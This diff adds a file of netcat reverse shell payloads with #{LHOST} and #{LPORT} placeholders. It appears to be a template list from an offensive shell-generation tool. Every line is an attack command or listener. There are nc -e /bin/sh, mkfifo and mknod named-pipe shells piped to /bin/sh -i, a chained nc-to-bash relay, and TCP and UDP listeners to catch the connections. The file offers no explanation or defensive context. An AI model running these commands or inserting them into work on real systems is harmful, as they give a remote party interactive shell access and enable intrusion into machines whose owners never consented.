@@ -1,0 +1,16 @@
+nc -e /bin/sh #{LHOST} #{LPORT}
+
+# desc: Blind
+nc #{LHOST} #{LPORT} | /bin/sh 
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc #{LHOST} #{LPORT} >/tmp/f
+
+nc #{LHOST} #{LPORT} | /bin/bash | nc #{LHOST} #{lport2}
+
+rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc #{LHOST} #{LPORT} 1>/tmp/bkpipe
+
+# desc: Listener TCP
+nc -nvlp #{LPORT}
+
+# desc: Listener UDP
+nc -uvlp #{LPORT}
